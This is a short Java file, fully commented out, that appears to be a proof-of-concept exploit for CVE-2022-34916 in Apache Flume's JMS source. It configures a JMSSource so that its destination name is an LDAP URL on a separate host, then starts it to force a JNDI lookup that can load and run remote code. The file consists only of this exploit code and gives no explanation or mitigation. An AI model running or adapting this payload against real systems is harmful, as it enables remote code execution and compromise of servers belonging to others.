//package flume;
//
//import org.apache.flume.Context;
//import org.apache.flume.channel.ChannelProcessor;
//import org.apache.flume.channel.MultiplexingChannelSelector;
//import org.apache.flume.source.jms.JMSSource;
//import javax.jms.JMSException;
//
//import java.util.HashMap;
//
//public class CVE_2022_34916 {
//
//    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {
//        JMSSource jmsSource = new JMSSource();
//        HashMap<String,String> hashMap = new HashMap<>();
//        hashMap.put("initialContextFactory","org.apache.activemq.jndi.ActiveMQInitialContextFactory");
//        hashMap.put("providerURL","tcp://10.41.230.6:61616");
//        hashMap.put("destinationName","ldap://10.58.120.200:1389/nco5cx");
//        hashMap.put("destinationType","QUEUE");
//        hashMap.put("destinationLocator","JNDI");
//        Context context = new Context(hashMap);
//        jmsSource.configure(context);
//        jmsSource.setChannelProcessor(new ChannelProcessor(new MultiplexingChannelSelector()));
//        jmsSource.start();
//
//    }
//}